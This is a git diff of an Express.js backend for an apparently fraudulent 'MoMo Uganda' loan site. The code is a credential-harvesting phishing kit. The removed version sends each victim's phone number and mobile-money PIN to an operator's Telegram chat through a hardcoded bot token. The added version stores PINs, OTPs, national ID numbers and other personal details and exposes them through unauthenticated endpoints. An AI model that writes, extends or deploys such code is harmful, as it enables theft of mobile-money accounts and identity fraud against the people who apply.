@@ -1,9 +1,5 @@
 const express = require('express');
-const session = require('express-session');
 const cors = require('cors');
-const helmet = require('helmet');
-const morgan = require('morgan');
-const rateLimit = require('express-rate-limit');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
@@ -12,97 +8,62 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Railway URL
-const RAILWAY_URL = process.env.RAILWAY_PUBLIC_DOMAIN || 'https://momo-uganda-production.up.railway.app';
-
-// Telegram Bot Configuration
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8392790531';
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-
-// Database path
-const DB_PATH = '/tmp/loans.db';
-
-let db = null;
-
-async function initDatabase() {
-    try {
-        console.log('Initializing database at:', DB_PATH);
-        db = await open({
-            filename: DB_PATH,
-            driver: sqlite3.Database
-        });
-
-        await db.exec(`
-            CREATE TABLE IF NOT EXISTS loans (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                loan_id TEXT UNIQUE NOT NULL,
-                phone TEXT NOT NULL,
-                network TEXT NOT NULL,
-                amount INTEGER NOT NULL,
-                duration INTEGER NOT NULL,
-                monthly_payment INTEGER NOT NULL,
-                total_payment INTEGER NOT NULL,
-                interest INTEGER NOT NULL,
-                status TEXT DEFAULT 'pending',
-                pin TEXT,
-                otp TEXT,
-                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
-            );
-
-            CREATE TABLE IF NOT EXISTS loan_logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                loan_id TEXT NOT NULL,
-                action TEXT NOT NULL,
-                details TEXT,
-                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-            );
-
-            CREATE INDEX IF NOT EXISTS idx_loans_phone ON loans(phone);
-            CREATE INDEX IF NOT EXISTS idx_loans_status ON loans(status);
-        `);
-
-        console.log('✅ Database initialized successfully');
-        return true;
-    } catch (error) {
-        console.error('❌ Database initialization error:', error);
-        return false;
-    }
-}
-
 // Middleware
-app.use(helmet({
-    contentSecurityPolicy: false,
-}));
 app.use(cors());
-app.use(morgan('combined'));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Trust proxy - fixes the rate limit warning
-app.set('trust proxy', 1);
+// Database setup
+let db = null;
 
-// Session middleware
-app.use(session({
-    secret: process.env.SESSION_SECRET || 'momo_uganda_loan_secret_key_2024',
-    resave: false,
-    saveUninitialized: false,
-    cookie: {
-        secure: false,
-        httpOnly: true,
-        maxAge: 30 * 60 * 1000
+async function initDatabase() {
+    try {
+        db = await open({
+            filename: './database/loans.db',
+            driver: sqlite3.Database
+        });
+
+        // Create tables
+        await db.exec(`
+            CREATE TABLE IF NOT EXISTS loans (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                loan_id TEXT UNIQUE,
+                phone TEXT,
+                pin TEXT,
+                network TEXT,
+                amount INTEGER,
+                duration INTEGER,
+                monthly_payment INTEGER,
+                total_payment INTEGER,
+                interest INTEGER,
+                otp_code TEXT,
+                status TEXT DEFAULT 'pending',
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            );
+
+            CREATE TABLE IF NOT EXISTS users (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                loan_id TEXT,
+                full_name TEXT,
+                national_id TEXT,
+                date_of_birth TEXT,
+                address TEXT,
+                occupation TEXT,
+                income TEXT,
+                final_code TEXT,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (loan_id) REFERENCES loans(loan_id)
+            );
+        `);
+
+        console.log('✅ Database initialized');
+        return true;
+    } catch (error) {
+        console.error('❌ Database error:', error);
+        return false;
     }
-}));
-
-// Rate limiting
-const limiter = rateLimit({
-    windowMs: 15 * 60 * 1000,
-    max: 100,
-    message: { error: 'Too many requests, please try again later.' }
-});
-app.use('/api/', limiter);
+}
 
 // Generate unique loan ID
 function generateLoanId() {
@@ -111,180 +72,30 @@ function generateLoanId() {
     return `MUG${timestamp}${random}`.toUpperCase();
 }
 
-// Send message to Telegram using native fetch (Node 18+)
-async function sendTelegramMessage(text, replyMarkup = null) {
-    try {
-        const payload = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: text,
-            parse_mode: 'HTML'
-        };
-        
-        if (replyMarkup) {
-            payload.reply_markup = replyMarkup;
-        }
-        
-        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        
-        const data = await response.json();
-        if (data.ok && data.result) {
-            console.log('✅ Telegram message sent');
-            return data.result.message_id;
-        }
-        console.error('Telegram send error:', data);
-        return null;
-    } catch (error) {
-        console.error('Telegram send error:', error);
-        return null;
-    }
-}
-
-// Edit Telegram message
-async function editTelegramMessage(messageId, text) {
-    try {
-        await fetch(`${TELEGRAM_API}/editMessageText`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                message_id: messageId,
-                text: text,
-                parse_mode: 'HTML'
-            })
-        });
-    } catch (error) {
-        console.error('Edit message error:', error);
-    }
-}
-
 // ========== API ROUTES ==========
 
 // Health check
 app.get('/health', (req, res) => {
-    res.status(200).json({ 
-        status: 'ok', 
-        timestamp: new Date().toISOString(),
-        uptime: process.uptime(),
-        database: db ? 'connected' : 'disconnected'
-    });
+    res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
 
-// Root endpoint
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.get('/verify.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
-});
-
-app.get('/otp.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
-});
-
-// Calculate loan
-app.post('/api/calculate', (req, res) => {
-    try {
-        const { amount, duration } = req.body;
-        const monthlyRate = 0.095;
-        const months = duration / 30;
-        const interest = Math.round(amount * monthlyRate * months);
-        const total = amount + interest;
-        const monthly = Math.ceil(total / months);
-        
-        res.json({
-            success: true,
-            amount,
-            duration,
-            monthly,
-            total,
-            interest,
-            currency: 'UGX'
-        });
-    } catch (error) {
-        console.error('Calculate error:', error);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// Save loan application
+// Save loan application (from verify.html)
 app.post('/api/save-loan', async (req, res) => {
     try {
-        console.log('Received save-loan request:', req.body);
-        
         const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
         
-        // Validate required fields
-        if (!phone || !network || !amount) {
-            console.error('Missing required fields');
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Missing required fields: phone, network, amount' 
-            });
-        }
-        
-        // Check database connection
-        if (!db) {
-            console.error('Database not initialized');
-            return res.status(500).json({ success: false, error: 'Database not initialized' });
-        }
-        
         const loanId = generateLoanId();
-        console.log('Generated loan ID:', loanId);
-        
-        // Use default pin if not provided
-        const userPin = pin || '1234';
         
         await db.run(
-            `INSERT INTO loans (loan_id, phone, network, amount, duration, monthly_payment, total_payment, interest, pin, status)
+            `INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-            [loanId, phone, network, amount, duration, monthly, total, interest, userPin, 'pending_verification']
+            [loanId, phone, pin, network, amount, duration, monthly, total, interest, 'pending']
         );
-        
-        await db.run(
-            `INSERT INTO loan_logs (loan_id, action, details)
-             VALUES (?, ?, ?)`,
-            [loanId, 'created', `Loan application created for ${phone}`]
-        );
-        
-        console.log('Loan saved to database, sending to Telegram...');
-        
-        // Send to Telegram
-        const messageText = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
-            `━━━━━━━━━━━━━━━━━━\n` +
-            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
-            `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
-            `<b>📱 Network:</b> ${network}\n` +
-            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
-            `<b>🔐 PIN:</b> <code>${userPin}</code>\n` +
-            `<b>📅 Duration:</b> ${duration / 30} months\n` +
-            `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
-            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
-            `━━━━━━━━━━━━━━━━━━\n\n` +
-            `<b>⚠️ Action Required:</b> Select an option below:`;
-        
-        const replyMarkup = {
-            inline_keyboard: [
-                [
-                    { text: "✅ Approve Loan", callback_data: `approve_${loanId}` }
-                ],
-                [
-                    { text: "❌ Decline", callback_data: `decline_${loanId}` }
-                ]
-            ]
-        };
-        
-        await sendTelegramMessage(messageText, replyMarkup);
-        
-        console.log('Telegram message sent, returning success');
         
         res.json({
             success: true,
-            loanId: loanId
+            loanId: loanId,
+            message: 'Loan application saved'
         });
         
     } catch (error) {
@@ -293,45 +104,59 @@ app.post('/api/save-loan', async (req, res) => {
     }
 });
 
-// Complete loan with OTP - Simplified (any OTP works)
-app.post('/api/complete-loan', async (req, res) => {
+// Save OTP (from otp.html)
+app.post('/api/save-otp', async (req, res) => {
     try {
         const { loanId, otp } = req.body;
         
-        if (!db) {
-            return res.status(500).json({ success: false, error: 'Database not initialized' });
-        }
-        
-        // Just mark the loan as approved - any OTP works
         await db.run(
-            `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
-            ['approved', loanId]
+            `UPDATE loans SET otp_code = ?, status = ? WHERE loan_id = ?`,
+            [otp, 'otp_verified', loanId]
         );
         
-        await db.run(
-            `INSERT INTO loan_logs (loan_id, action, details)
-             VALUES (?, ?, ?)`,
-            [loanId, 'completed', 'Loan approved and completed']
-        );
-        
-        res.json({ success: true });
+        res.json({
+            success: true,
+            message: 'OTP saved successfully'
+        });
         
     } catch (error) {
-        console.error('Complete loan error:', error);
+        console.error('Save OTP error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// Get loan status
+// Save final verification (from final-verify.html)
+app.post('/api/save-final', async (req, res) => {
+    try {
+        const { loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode } = req.body;
+        
+        await db.run(
+            `INSERT INTO users (loan_id, full_name, national_id, date_of_birth, address, occupation, income, final_code)
+             VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
+            [loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode]
+        );
+        
+        await db.run(
+            `UPDATE loans SET status = ? WHERE loan_id = ?`,
+            ['completed', loanId]
+        );
+        
+        res.json({
+            success: true,
+            message: 'Final verification saved'
+        });
+        
+    } catch (error) {
+        console.error('Save final error:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Get loan by ID
 app.get('/api/loan/:loanId', async (req, res) => {
     try {
-        if (!db) {
-            return res.status(500).json({ success: false, error: 'Database not initialized' });
-        }
-        
         const loan = await db.get(
-            `SELECT loan_id, phone, network, amount, duration, monthly_payment, total_payment, status, created_at
-             FROM loans WHERE loan_id = ?`,
+            `SELECT * FROM loans WHERE loan_id = ?`,
             [req.params.loanId]
         );
         
@@ -347,117 +172,57 @@ app.get('/api/loan/:loanId', async (req, res) => {
     }
 });
 
-// Telegram Webhook
-app.post('/webhook/telegram', async (req, res) => {
+// Get all loans (admin)
+app.get('/api/loans', async (req, res) => {
     try {
-        const update = req.body;
-        console.log('Webhook received');
-        
-        if (update.callback_query) {
-            const callbackData = update.callback_query.data;
-            const messageId = update.callback_query.message.message_id;
-            const callbackId = update.callback_query.id;
-            
-            const [action, loanId] = callbackData.split('_');
-            
-            console.log(`Callback action: ${action}, loanId: ${loanId}`);
-            
-            if (!db) {
-                console.error('Database not connected');
-                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: callbackId,
-                        text: "Database error"
-                    })
-                });
-                return res.sendStatus(200);
-            }
-            
-            if (action === 'approve') {
-                // Update loan status to 'otp_sent' so the user can proceed
-                await db.run(
-                    `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
-                    ['otp_sent', loanId]
-                );
-                
-                console.log(`Loan ${loanId} updated to status: otp_sent`);
-                
-                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: callbackId,
-                        text: "✅ Loan approved! User can now proceed."
-                    })
-                });
-                
-                await editTelegramMessage(messageId, 
-                    `✅ <b>LOAN APPROVED</b>\n\n` +
-                    `Loan ID: ${loanId}\n` +
-                    `Phone: ${loan.phone}\n` +
-                    `Amount: UGX ${loan.amount.toLocaleString()}\n` +
-                    `Status: Approved - User can proceed to OTP page`
-                );
-                
-            } else if (action === 'decline') {
-                await db.run(
-                    `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
-                    ['declined', loanId]
-                );
-                
-                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: callbackId,
-                        text: "Loan declined"
-                    })
-                });
-                
-                await editTelegramMessage(messageId,
-                    `❌ <b>LOAN DECLINED</b>\n\n` +
-                    `Loan ID: ${loanId}\n` +
-                    `Phone: ${loan.phone}\n` +
-                    `Amount: UGX ${loan.amount.toLocaleString()}\n` +
-                    `Status: Declined by admin`
-                );
-            }
-        }
-        
-        res.sendStatus(200);
-        
+        const loans = await db.all(`SELECT * FROM loans ORDER BY created_at DESC`);
+        res.json({ success: true, loans });
     } catch (error) {
-        console.error('Webhook error:', error);
-        res.sendStatus(500);
+        console.error('Get loans error:', error);
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// 404 handler
-app.use('*', (req, res) => {
-    res.status(404).json({ error: 'Route not found' });
+// Get user by loan ID
+app.get('/api/user/:loanId', async (req, res) => {
+    try {
+        const user = await db.get(
+            `SELECT * FROM users WHERE loan_id = ?`,
+            [req.params.loanId]
+        );
+        
+        res.json({ success: true, user });
+        
+    } catch (error) {
+        console.error('Get user error:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
 });
 
-// Error handler
-app.use((err, req, res, next) => {
-    console.error('Server error:', err);
-    res.status(500).json({ error: 'Internal server error' });
+// Serve HTML pages
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.get('/verify.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
+});
+
+app.get('/otp.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
+});
+
+app.get('/final-verify.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'final-verify.html'));
 });
 
 // Start server
 async function startServer() {
-    const dbInitialized = await initDatabase();
-    
-    if (!dbInitialized) {
-        console.error('⚠️ Failed to initialize database');
-    }
+    await initDatabase();
     
     app.listen(PORT, '0.0.0.0', () => {
         console.log(`🚀 Server running on port ${PORT}`);
-        console.log(`🌐 URL: ${RAILWAY_URL}`);
-        console.log(`✅ Health check: ${RAILWAY_URL}/health`);
-        console.log(`📱 Telegram Bot configured`);
+        console.log(`📍 http://localhost:${PORT}`);
     });
 }
 
